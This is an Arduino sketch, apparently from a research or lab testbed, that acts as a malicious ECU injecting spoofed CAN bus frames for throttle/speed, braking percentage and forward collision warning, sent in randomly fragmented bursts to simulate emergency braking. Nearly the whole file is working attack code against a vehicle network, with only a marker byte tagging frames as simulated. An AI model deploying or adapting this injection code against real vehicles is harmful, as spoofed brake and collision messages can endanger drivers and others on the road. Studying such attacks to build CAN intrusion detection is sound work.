/****************************************************************************
  CAN MALWARE CODE TO BE INJECTED INTO TRAFFIC

 This code is designed to be the malicious ECU module. The purpose of this 
 code is to inject spoofed packets into the dataline to then be 
 collected by the receiving ECU. 

  CAN ID 1: Throttle control
  CAN ID 2: Braking Control
  CAN ID 3: Forward Colision Warning
*************************************************************************/
#include <Canbus.h>
#include <defaults.h>
#include <global.h>
#include <mcp2515.h>
#include <mcp2515_defs.h>

int brakeStatusPercentage = 0x3C;
int currentCarSpeed = 0x00;
int randomVal = 0;
//********************************Setup Loop*********************************//
void setup(){
  Serial.begin(9600);
  delay(2000);

  Canbus.init(CANSPEED_500);
  delay(1000);
  Serial.println("Ready to Send Payload!");  
}

//********************************Main Loop*********************************//
void loop(){
  tCAN message; //Current car speed 
  tCAN messageA; //Current braking percentage
  tCAN messageB; //Forward Colision warninf reading
  int attackDuration = 0;

  //This generates the attack for 1000 times
  for(;attackDuration < 1000; attackDuration++){
    randomVal = randomNum();
    carBrakeAdjust(); //Change the car braking percentage 
    carSpeedAdjust(); //Change the current car speed

    //Once the current car speed goes to 0 km/hr, reset it to 60 km/hr
    //and make the braking percentage back to 0 to restart the simulation 
    //of emergency braking
    if(currentCarSpeed <= 0x00){
      currentCarSpeed = 0x3C;
      brakeStatusPercentage = 0x00;
    }

    //Determining if the spoofed car speed should be sent
    if(randomVal == 1 || randomVal == 4){
      message.id = 0x1; //ID Number for car Speed 
      message.header.rtr = 0;
      message.header.length = 2;
      message.data[0] = currentCarSpeed;
      message.data[1] = 0x01; //Bit used to identify this is not malicious, used to identify
                             //in code for verification and does not add value in simulation
      mcp2515_bit_modify(CANCTRL, (1 << REQOP2) | (1 << REQOP1) | (1 << REQOP0), 0);
      mcp2515_send_message(&message);
      delay(10);
    }

    //Determining if the spoofed braking percentage should be sent
    if(randomVal == 2 || randomVal == 4){
      messageA.id = 0x2; //ID Number for car Brake
      messageA.header.rtr = 0;
      messageA.data[0] = brakeStatusPercentage;
      messageA.data[1] = 0x01; //Bit used to identify this is not malicious, used to identify
                            //in code for verification and does not add value in simulation
      mcp2515_bit_modify(CANCTRL, (1 << REQOP2) | (1 << REQOP1) | (1 << REQOP0), 0);
      mcp2515_send_message(&messageA);
      delay(10);
    }

     //Determining if the spoofed forward collision warning reading should be sent
     if(randomVal == 3 || randomVal == 4){
      messageB.id = 0x3; //ID Number for car Brake
      messageB.header.rtr = 0;
      messageB.header.length = 2;
      messageB.data[0] = 0x01;
      messageB.data[1] = 0x01; //Bit used to identify this is not malicious, used to identify
                            //in code for verification and does not add value in simulation
      mcp2515_bit_modify(CANCTRL, (1 << REQOP2) | (1 << REQOP1) | (1 << REQOP0), 0);
      mcp2515_send_message(&messageB);
      delay(10);
    }
    Serial.println("Sent...");
  }
  delay(10000); //10 Seconds delay to give the attack a pause
}

//********************************carSpeedAdjust*********************************//
//This adjusts the current car speed
void carSpeedAdjust(){
    currentCarSpeed = (currentCarSpeed - ((0x01) * brakeStatusPercentage));
}


//********************************carBrakeAdjust********************************//
//Adjust the braking percentage so emergency braking of the car can be simulated.
void carBrakeAdjust(){
    brakeStatusPercentage = (brakeStatusPercentage + 0xA);
}

//********************************randomNum*************************************//
//Used to randomly determine what attacks should be sent to the datalines to 
//fragment the attack
int randomNum(){
  return (random(0, 5));
}
